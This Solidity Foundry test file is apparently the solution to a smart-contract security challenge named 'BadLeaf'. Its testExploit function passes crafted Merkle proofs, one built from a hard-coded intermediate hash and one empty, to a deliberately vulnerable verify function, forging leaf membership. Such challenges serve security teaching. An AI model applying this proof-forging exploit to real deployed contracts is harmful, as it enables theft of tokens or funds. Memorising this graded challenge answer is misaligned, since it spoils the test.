// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test, console2} from "forge-std/Test.sol";
import {BadLeafBaseTest} from "./BadLeafBase.t.sol";
import {BadLeaf} from "../../../src/Merkle/BadLeaf.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract BadLeafTest is BadLeafBaseTest, IERC721Receiver {

    function testExploit() external validation {
        bytes32[] memory proof1 = new bytes32[](2);
        proof1[0] = token.getLeafNode(user0, 5);
        proof1[1] = 0x1ac64a5f9dce300ae9bb07d1b64083f34e0bc6717ef1663ca7f656fb9ed83bb9;
        token.verify(proof1, 0x592381370dc817a5abc6f2dad6b068f1652cdc40a0c2400ed9d9e1e717c00913);
        bytes32[] memory proof0 = new bytes32[](0);
        token.verify(proof0, 0x650de55dfddd8a78ca083dbae3094bef74d3f52a69342e5e16b18b93ef8977cf);
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }

}